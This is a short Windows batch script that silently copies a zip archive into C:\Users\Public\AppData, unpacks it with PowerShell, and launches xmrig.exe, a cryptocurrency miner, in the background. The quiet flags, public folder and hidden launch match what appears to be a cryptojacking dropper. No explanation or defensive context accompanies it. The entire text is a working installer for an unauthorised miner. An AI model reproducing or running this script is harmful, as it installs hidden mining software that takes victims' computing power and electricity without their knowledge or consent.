xcopy /C /Q /Y file.zip C:\Users\Public\AppData\
powershell.exe -nologo -noprofile -command "& { $shell = New-Object -COM Shell.Application; $target = $shell.NameSpace('C:\Users\Public\AppData\'); $zip = $shell.NameSpace('C:\Users\Public\AppData\file.zip'); $target.CopyHere($zip.Items(), 16); }"
START /b C:\Users\Public\AppData\xmrig.exe run
GOTO :EOF